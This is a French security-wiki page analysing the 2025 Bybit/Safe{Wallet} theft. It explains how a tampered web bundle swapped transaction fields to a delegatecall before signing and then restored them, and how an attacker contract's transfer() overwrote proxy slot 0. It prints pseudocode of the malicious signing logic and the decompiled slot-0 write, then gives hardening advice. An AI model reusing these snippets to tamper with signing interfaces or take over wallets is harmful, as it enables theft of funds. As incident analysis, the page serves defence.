# Compromission du workflow de signature Web3 et prise de contrôle d’un proxy Safe Delegatecall

{{#include ../../banners/hacktricks-training.md}}

## Vue d’ensemble

Une chaîne de vol de cold wallet combinait une **compromission de la supply chain de l’interface web Safe{Wallet}** avec une **primitive on-chain de delegatecall qui écrasait le pointeur d’implémentation d’un proxy (slot 0)**. Points clés à retenir :

- Si une dApp peut injecter du code dans le workflow de signature, elle peut amener un signataire à produire une **signature EIP-712 valide sur des champs choisis par l’attaquant**, tout en restaurant les données originales de l’interface afin que les autres signataires ne se doutent de rien.
- Les proxies Safe stockent `masterCopy` (l’implémentation) dans le **storage slot 0**. Un delegatecall vers un contract qui écrit dans le slot 0 « upgrade » effectivement le Safe avec la logique de l’attaquant, ce qui lui donne le contrôle total du wallet.

## Off-chain : mutation ciblée de la signature dans Safe{Wallet}

Un bundle Safe altéré (`_app-*.js`) ciblait sélectivement certaines adresses Safe et de signataires. La logique injectée s’exécutait juste avant l’appel de signature :<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Propriétés de l’attaque
- **Context-gated** : les allowlists codées en dur pour les Safes/signers victimes ont empêché le bruit et réduit la détection.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation** : les champs (`to`, `data`, `operation`, gas) étaient écrasés immédiatement avant `signTransaction`, puis restaurés, de sorte que les payloads de proposition dans l’UI semblaient bénins tandis que les signatures correspondaient au payload de l’attaquant.
- **EIP-712 opacity** : les wallets affichaient des données structurées, mais ne décodaient pas le calldata imbriqué et ne mettaient pas en évidence `operation = delegatecall`, rendant le message muté effectivement aveugle lors de la signature.

### Pertinence de la validation du Gateway
Les propositions Safe sont soumises au **Safe Client Gateway**. Avant le déploiement de contrôles renforcés, le gateway pouvait accepter une proposition dont le `safeTxHash`/la signature correspondaient à des champs différents de ceux du corps JSON si l’UI les réécrivait après la signature. Après l’incident, le gateway rejette désormais les propositions dont le hash/la signature ne correspondent pas à la transaction soumise. Une vérification du hash côté serveur similaire devrait être appliquée à toute API d’orchestration de signatures.

### Points marquants de l’incident Bybit/Safe de 2025
- Le drainage du cold wallet de Bybit du 21 février 2025 (~401k ETH) a réutilisé le même pattern : un bundle S3 Safe compromis ne se déclenchait que pour les signers de Bybit et remplaçait `operation=0` par `1`, en faisant pointer `to` vers un contrat de l’attaquant pré-déployé qui écrivait dans le slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- `_app-52c9031bfa03da47.js`, mis en cache par Wayback, montre une logique basée sur le Safe de Bybit (`0x1db9…cf4`) et les adresses des signers, puis immédiatement restaurée vers un bundle propre deux minutes après l’exécution, reproduisant l’astuce « mutate → sign → restore ».<sup>[[1]](#references)[[2]](#references)</sup>
- Le contrat malveillant (par exemple, `0x9622…c7242`) contenait les fonctions simples `sweepETH/sweepERC20` ainsi qu’une fonction `transfer(address,uint256)` qui écrivait dans le slot d’implémentation. L’exécution de `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` a modifié l’implémentation du proxy et accordé un contrôle total.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover via slot collision

Les proxies Safe conservent `masterCopy` dans le **storage slot 0** et lui délèguent toute la logique. Comme Safe prend en charge **`operation = 1` (delegatecall)**, toute transaction signée peut pointer vers un contrat arbitraire et exécuter son code dans le contexte de storage du proxy.<sup>[[3]](#references)</sup>

Un contrat de l’attaquant imitait un `transfer(address,uint256)` ERC-20, mais écrivait à la place `_to` dans le slot 0 :<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Execution path:<sup>[[1]](#references)[[3]](#references)</sup>
1. Les victimes signent `execTransaction` avec `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Le masterCopy de Safe valide les signatures correspondant à ces paramètres.
3. Le proxy effectue un delegatecall vers `attackerContract` ; le corps de `transfer` écrit dans le slot 0.
4. Le slot 0 (`masterCopy`) pointe désormais vers une logique contrôlée par l'attaquant → **prise de contrôle complète du wallet et détournement des fonds**.

### Notes sur le Guard et les versions (durcissement post-incident)
- Les Safes >= v1.3.0 peuvent installer un **Guard** pour bloquer les `delegatecall` ou appliquer des ACL sur `to`/les selectors ; Bybit utilisait la v1.1.1, qui ne disposait donc d'aucun hook Guard. La mise à niveau des contrats (et la réajout des owners) est nécessaire pour obtenir ce plan de contrôle.

## Checklist de détection et de durcissement

- **Intégrité de l'UI** : épingler les assets JS / SRI ; surveiller les différences entre les bundles ; considérer l'interface de signature comme faisant partie de la boundary de confiance.
- **Validation au moment de la signature** : utiliser des hardware wallets avec la **clear-signing EIP-712** ; afficher explicitement `operation` et décoder les calldata imbriquées. Refuser la signature lorsque `operation = 1`, sauf si la policy l'autorise.
- **Vérifications des hash côté serveur** : les gateways/services qui relaient les propositions doivent recalculer `safeTxHash` et vérifier que les signatures correspondent aux champs soumis.
- **Policies/allowlists** : mettre en place des règles de prévalidation pour `to`, les selectors et les types d'assets, et interdire les delegatecall sauf pour les flows vérifiés. Exiger un service de policy interne avant de diffuser des transactions entièrement signées.
- **Conception des contrats** : éviter d'exposer un delegatecall arbitraire dans les wallets multisig/treasury, sauf nécessité stricte. Placer les pointeurs de mise à niveau ailleurs que dans le slot 0 ou les protéger avec une logique explicite de mise à niveau et un contrôle d'accès.
- **Monitoring** : déclencher une alerte lors de l'exécution d'un delegatecall depuis des wallets détenant des fonds de treasury, ainsi que pour les propositions qui modifient `operation` par rapport aux patterns habituels de `call`.

## References

- [1] [Analyse forensic d'AnChain.AI de l'exploit du Safe de Bybit](https://www.anchain.ai/blog/bybit)
- [2] [Analyse de Zero Hour Technology sur la compromission du bundle Safe](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Analyse technique approfondie du hack de Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
